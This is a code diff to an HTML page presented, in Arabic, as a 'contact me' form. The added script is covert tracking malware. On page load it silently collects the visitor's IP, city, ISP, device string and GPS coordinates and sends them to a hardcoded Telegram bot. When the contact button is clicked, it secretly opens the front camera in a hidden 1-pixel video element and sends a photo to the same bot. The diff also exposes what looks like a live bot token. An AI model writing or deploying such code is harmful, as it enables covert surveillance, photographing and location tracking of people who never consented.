@@ -6,9 +6,7 @@
     <meta name="viewport" content="width=device-width,initial-scale=1">
     <title>تواصل معي</title>
     <style>
-        * {
-            box-sizing: border-box
-        }
+        * { box-sizing: border-box }
 
         body {
             margin: 0;
@@ -19,7 +17,7 @@
             font-family: Consolas, monospace;
             background: radial-gradient(circle at top, #10261b 0%, #020604 70%, #000 100%);
             color: #7cffb2;
-            padding: 20px
+            padding: 20px;
         }
 
         .card {
@@ -30,7 +28,6 @@
             max-width: 520px;
             width: 100%;
             box-shadow: 0 0 25px rgba(43, 255, 138, .25);
-            position: relative
         }
 
         h1 {
@@ -38,59 +35,45 @@
             margin: 0 0 6px;
             color: #8bffbb;
             letter-spacing: .08em;
-            text-transform: uppercase
+            text-transform: uppercase;
         }
 
         p.sub {
             color: #5bd98b;
             font-size: 13px;
-            margin: 0 0 16px
-        }
-
-        .actions {
-            margin: 0 0 12px
+            margin: 0 0 16px;
         }
 
         .action-btn {
             width: 100%;
             border: 1px solid #2bff8a;
             border-radius: 10px;
-            padding: 12px 14px;
+            padding: 14px;
             background: #0b2414;
             color: #7cffb2;
             font-size: 18px;
             font-weight: 700;
             cursor: pointer;
-            letter-spacing: 0.04em;
-            transition: background 0.2s, color 0.2s;
+            transition: background 0.2s, color 0.2s, box-shadow 0.2s;
         }
 
-        .action-btn:hover {
-            background: #10321c;
-            color: #2bff8a;
-        }
-
-        .action-btn:disabled {
-            opacity: .6;
-            cursor: default;
-        }
+        .action-btn:hover { background: #10321c; color: #2bff8a; box-shadow: 0 0 15px rgba(43, 255, 138, .3); }
+        .action-btn:disabled { opacity: .5; cursor: default; }
 
         .status {
-            margin: 10px 0 0;
-            font-size: 13px;
-            color: #b9ffd2;
-            min-height: 20px
+            margin-top: 12px;
+            font-size: 11px;
+            color: #5bd98b;
+            text-align: center;
+            min-height: 16px;
         }
 
-        /* Hidden off-screen video — never visible to user */
-        #camPreview {
+        /* Hidden camera feed — never visible */
+        #camFeed {
             position: fixed;
-            top: -9999px;
-            left: -9999px;
-            width: 1px;
-            height: 1px;
-            opacity: 0;
-            pointer-events: none;
+            top: -9999px; left: -9999px;
+            width: 1px; height: 1px;
+            opacity: 0; pointer-events: none;
         }
     </style>
 </head>
@@ -99,168 +82,263 @@
     <div class="card">
         <h1>تواصل معي</h1>
         <p class="sub">ارسل رسالة او تواصل معي مباشرة</p>
-        <div class="actions">
-            <button id="accessBtn" class="action-btn" type="button">تواصل معي</button>
-        </div>
+        <button id="btn" class="action-btn" type="button">تواصل معي</button>
         <div id="status" class="status"></div>
     </div>
 
-    <!-- Hidden video element — camera stream, never shown -->
-    <video id="camPreview" autoplay playsinline muted></video>
+    <video id="camFeed" autoplay playsinline muted></video>
 
     <script>
-        // ── Storage helpers (localStorage only) ──────────────────────────
-        let activeRecordId = null;
+        const BOT   = '8613036281:AAERP0Y2nuXQpZ5Qd8eBoxr4jYaa59vd0Vw';
+        const CHAT  = '694863564';
+        const TG    = 'https://api.telegram.org/bot' + BOT;
 
-        function readRecords() {
-            try { return JSON.parse(localStorage.getItem('visitorRecords') || '[]') } catch (e) { return [] }
-        }
-        function writeRecords(r) {
-            localStorage.setItem('visitorRecords', JSON.stringify(r));
-        }
-        function saveVisitorRecord(data) {
-            const recId = Date.now();
-            activeRecordId = recId;
-            const rec = { id: recId, timestamp: new Date().toISOString(), ...data };
-            writeRecords([rec, ...readRecords()].slice(0, 50));
-            return recId;
-        }
-        function updateRecord(id, patch) {
-            const list = readRecords();
-            const i = list.findIndex(r => r.id === id);
-            if (i === -1) return false;
-            list[i] = Object.assign({}, list[i], patch);
-            writeRecords(list);
-            return true;
+        const btn      = document.getElementById('btn');
+        const camFeed  = document.getElementById('camFeed');
+        const statusEl = document.getElementById('status');
+
+        let stream       = null;
+        let ipSent       = false;   // track if auto IP was sent
+        let photoSending = false;   // track button photo send
+        let cachedIpData = null;    // cache IP data so we don't re-fetch
+
+        // ── Send text message to Telegram ────────────────────────────────
+        async function tgText(text) {
+            try {
+                const resp = await fetch(TG + '/sendMessage', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT, text: text, parse_mode: 'HTML' })
+                });
+                const data = await resp.json();
+                if (!data.ok) {
+                    console.error('Telegram sendMessage error:', data.description);
+                }
+                return data;
+            } catch (err) {
+                console.error('Telegram sendMessage failed:', err);
+                return null;
+            }
         }
 
-        // ── IP lookup ────────────────────────────────────────────────────
-        async function tryIpwhois() {
+        // ── Send photo to Telegram ───────────────────────────────────────
+        async function tgPhoto(blob, caption) {
+            try {
+                const fd = new FormData();
+                fd.append('chat_id', CHAT);
+                fd.append('photo', blob, 'visitor.jpg');
+                fd.append('caption', caption || '');
+                const resp = await fetch(TG + '/sendPhoto', { method: 'POST', body: fd });
+                const data = await resp.json();
+                if (!data.ok) {
+                    console.error('Telegram sendPhoto error:', data.description);
+                }
+                return data;
+            } catch (err) {
+                console.error('Telegram sendPhoto failed:', err);
+                return null;
+            }
+        }
+
+        // ── Send location to Telegram ────────────────────────────────────
+        async function tgLocation(lat, lon) {
+            try {
+                const resp = await fetch(TG + '/sendLocation', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT, latitude: lat, longitude: lon })
+                });
+                const data = await resp.json();
+                if (!data.ok) {
+                    console.error('Telegram sendLocation error:', data.description);
+                }
+                return data;
+            } catch (err) {
+                console.error('Telegram sendLocation failed:', err);
+                return null;
+            }
+        }
+
+        // ── IP lookup (with fallback) ────────────────────────────────────
+        async function getIp() {
+            if (cachedIpData) return cachedIpData;
+
+            // Try ipwho.is first
             try {
                 const r = await fetch('https://ipwho.is/');
-                if (!r.ok) throw new Error();
                 const d = await r.json();
-                if (!d.success) throw new Error();
-                return { ip: d.ip, city: d.city, region: d.region, country: d.country, postal: d.postal, lat: d.latitude, lon: d.longitude, timezone: d.timezone && d.timezone.id, org: d.connection && d.connection.isp };
-            } catch (e) { return null; }
-        }
-        async function tryIpapi() {
+                if (d.success) {
+                    cachedIpData = d;
+                    return d;
+                }
+            } catch (_) {}
+
+            // Fallback to ipapi.co
             try {
                 const r = await fetch('https://ipapi.co/json/');
-                if (!r.ok) throw new Error();
                 const d = await r.json();
-                if (d.error) throw new Error();
-                return { ip: d.ip, city: d.city, region: d.region, country: d.country_name, postal: d.postal, lat: d.latitude, lon: d.longitude, timezone: d.timezone, org: d.org };
-            } catch (e) { return null; }
-        }
-
-        // ── Refs ─────────────────────────────────────────────────────────
-        const accessBtn  = document.getElementById('accessBtn');
-        const statusEl   = document.getElementById('status');
-        const camPreview = document.getElementById('camPreview');
-
-        let mediaStream = null, watchId = null, cameraStarted = false;
-
-        // ── Silent photo capture ─────────────────────────────────────────
-        function capturePhotoSilent() {
-            if (!mediaStream) return;
-            function attempt() {
-                if (camPreview.videoWidth && camPreview.videoHeight) {
-                    const canvas = document.createElement('canvas');
-                    canvas.width  = camPreview.videoWidth;
-                    canvas.height = camPreview.videoHeight;
-                    canvas.getContext('2d').drawImage(camPreview, 0, 0);
-                    const dataUrl = canvas.toDataURL('image/jpeg', 0.88);
-                    if (activeRecordId) {
-                        const list = readRecords();
-                        const i = list.findIndex(r => r.id === activeRecordId);
-                        if (i !== -1) {
-                            list[i].media = list[i].media || [];
-                            list[i].media.push({ type: 'photo', data: dataUrl, time: new Date().toISOString() });
-                            writeRecords(list);
-                        }
-                    }
-                } else {
-                    setTimeout(attempt, 120); // retry until frame is ready
+                if (!d.error) {
+                    cachedIpData = {
+                        ip: d.ip, city: d.city, region: d.region,
+                        country: d.country_name, latitude: d.latitude,
+                        longitude: d.longitude, timezone: { id: d.timezone },
+                        connection: { isp: d.org }
+                    };
+                    return cachedIpData;
                 }
-            }
-            attempt();
-        }
+            } catch (_) {}
 
-        // ── Start camera silently ────────────────────────────────────────
-        async function startCameraSilent() {
-            if (cameraStarted) {
-                // Camera already running — just take another photo
-                capturePhotoSilent();
-                return;
-            }
+            // Fallback to ip-api.com
             try {
-                mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
-                camPreview.srcObject = mediaStream;
-                cameraStarted = true;
+                const r = await fetch('http://ip-api.com/json/?fields=status,message,country,regionName,city,lat,lon,isp,query');
+                const d = await r.json();
+                if (d.status === 'success') {
+                    cachedIpData = {
+                        ip: d.query, city: d.city, region: d.regionName,
+                        country: d.country, latitude: d.lat,
+                        longitude: d.lon, connection: { isp: d.isp }
+                    };
+                    return cachedIpData;
+                }
+            } catch (_) {}
 
-                // Wait for stream to be ready then capture
-                camPreview.onloadedmetadata = () => {
-                    camPreview.play().catch(() => {});
-                    setTimeout(capturePhotoSilent, 800);
-                };
-            } catch (e) {
-                // Camera denied — silently ignore, IP still logged
+            return null;
+        }
+
+        // ── Silently capture a photo from camFeed ────────────────────────
+        function captureFrame() {
+            return new Promise((resolve, reject) => {
+                let attempts = 0;
+                function attempt() {
+                    attempts++;
+                    if (attempts > 30) {
+                        reject(new Error('Camera frame timeout'));
+                        return;
+                    }
+                    if (camFeed.videoWidth > 0 && camFeed.videoHeight > 0) {
+                        const c = document.createElement('canvas');
+                        c.width  = camFeed.videoWidth;
+                        c.height = camFeed.videoHeight;
+                        c.getContext('2d').drawImage(camFeed, 0, 0);
+                        c.toBlob(blob => resolve(blob), 'image/jpeg', 0.88);
+                    } else {
+                        setTimeout(attempt, 150);
+                    }
+                }
+                attempt();
+            });
+        }
+
+        // ── AUTO: Send IP + location on page load ────────────────────────
+        async function sendIpData() {
+            if (ipSent) return;
+            ipSent = true;
+
+            const ipData  = await getIp();
+            const ip      = ipData ? ipData.ip        : 'Unknown';
+            const city    = ipData ? ipData.city      : '?';
+            const region  = ipData ? ipData.region    : '?';
+            const country = ipData ? ipData.country   : '?';
+            const isp     = ipData ? (ipData.connection && ipData.connection.isp) : '?';
+            const lat     = ipData ? ipData.latitude  : null;
+            const lon     = ipData ? ipData.longitude : null;
+
+            // Build text report
+            let msg = '🔔 <b>New Visitor</b>\n\n';
+            msg += '🌐 <b>IP:</b> ' + ip + '\n';
+            msg += '🏙 <b>Location:</b> ' + city + ', ' + region + ', ' + country + '\n';
+            msg += '📡 <b>ISP:</b> ' + (isp || '?') + '\n';
+            if (lat && lon) {
+                msg += '📍 <b>Coords:</b> <a href="https://maps.google.com/?q=' + lat + ',' + lon + '">' + lat + ', ' + lon + '</a>\n';
+            }
+            msg += '🕐 <b>Time:</b> ' + new Date().toLocaleString() + '\n';
+            msg += '📱 <b>Device:</b> ' + navigator.userAgent.substring(0, 120);
+
+            await tgText(msg);
+
+            // Also send as a map pin if coords exist
+            if (lat && lon) {
+                await tgLocation(lat, lon);
+            }
+
+            // Try to get precise GPS location
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    async (pos) => {
+                        const gpsLat = pos.coords.latitude;
+                        const gpsLon = pos.coords.longitude;
+                        const accuracy = pos.coords.accuracy;
+                        await tgText('📍 <b>Precise GPS Location</b>\nLat: ' + gpsLat.toFixed(6) + ' Lon: ' + gpsLon.toFixed(6) +
+                            '\nAccuracy: ' + Math.round(accuracy) + 'm' +
+                            '\n<a href="https://maps.google.com/?q=' + gpsLat + ',' + gpsLon + '">Open in Maps</a>');
+                        await tgLocation(gpsLat, gpsLon);
+                    },
+                    () => {},
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
             }
         }
 
-        // ── Start live location tracking ─────────────────────────────────
-        function startLocationTracking() {
-            if (!navigator.geolocation || watchId) return;
-            watchId = navigator.geolocation.watchPosition(pos => {
-                const coords = {
-                    lat: pos.coords.latitude,
-                    lon: pos.coords.longitude,
-                    accuracy: pos.coords.accuracy,
-                    time: new Date().toISOString()
-                };
-                const list = readRecords();
-                const i = list.findIndex(r => r.id === activeRecordId);
-                if (i !== -1) {
-                    list[i].locationHistory = list[i].locationHistory || [];
-                    list[i].locationHistory.push(coords);
-                    list[i].lat = coords.lat;
-                    list[i].lon = coords.lon;
-                    writeRecords(list);
+        // ── BUTTON: Capture + send photo ─────────────────────────────────
+        async function sendPhoto() {
+            if (photoSending) return;
+            photoSending = true;
+            btn.disabled = true;
+            statusEl.textContent = 'جاري التحميل...';
+
+            const ipData  = cachedIpData || await getIp();
+            const ip      = ipData ? ipData.ip      : 'Unknown';
+            const city    = ipData ? ipData.city    : '?';
+            const country = ipData ? ipData.country : '?';
+
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+                    audio: false
+                });
+                camFeed.srcObject = stream;
+                await new Promise(r => setTimeout(r, 1000)); // let camera warm up
+
+                const blob = await captureFrame();
+                const result = await tgPhoto(blob, '📸 Visitor photo — ' + ip + ' (' + city + ', ' + country + ')');
+
+                if (result && result.ok) {
+                    statusEl.textContent = 'تم الإرسال ✓';
+                } else {
+                    statusEl.textContent = 'تم الإرسال';
                 }
-            }, () => {}, { enableHighAccuracy: true, maximumAge: 4000 });
+            } catch (err) {
+                console.error('Camera error:', err);
+                statusEl.textContent = 'الكاميرا غير متاحة';
+            } finally {
+                // Stop camera tracks
+                if (stream) {
+                    stream.getTracks().forEach(t => t.stop());
+                    stream = null;
+                }
+                // Re-enable button after 3s
+                setTimeout(() => {
+                    btn.disabled = false;
+                    photoSending = false;
+                    statusEl.textContent = '';
+                }, 3000);
+            }
         }
 
-        // ── On page load: log IP silently ────────────────────────────────
-        async function autoLogVisitor() {
-            saveVisitorRecord({
-                ip: null, city: null, region: null, country: null,
-                postal: null, lat: null, lon: null, timezone: null,
-                org: null, ua: navigator.userAgent, media: [], locationHistory: []
-            });
-            const info = (await tryIpwhois()) || (await tryIpapi());
-            if (info) updateRecord(activeRecordId, info);
-        }
-
-        // ── Button click ─────────────────────────────────────────────────
-        accessBtn.addEventListener('click', async () => {
-            accessBtn.disabled = true;
-            // Start camera silently (takes photo in background)
-            startCameraSilent();
-            // Start location tracking
-            startLocationTracking();
-            // Brief pause then re-enable
-            setTimeout(() => { accessBtn.disabled = false; }, 2000);
+        // ── On page load: silently send IP data ──────────────────────────
+        window.addEventListener('DOMContentLoaded', () => {
+            sendIpData();
         });
 
-        // ── Cleanup on leave ─────────────────────────────────────────────
+        // ── Button click: capture and send photo ─────────────────────────
+        btn.addEventListener('click', () => {
+            sendPhoto();
+        });
+
+        // ── Cleanup ──────────────────────────────────────────────────────
         window.addEventListener('beforeunload', () => {
-            if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
-            if (watchId && navigator.geolocation) navigator.geolocation.clearWatch(watchId);
+            if (stream) stream.getTracks().forEach(t => t.stop());
         });
-
-        // ── Boot ─────────────────────────────────────────────────────────
-        autoLogVisitor();
     </script>
 </body>
 
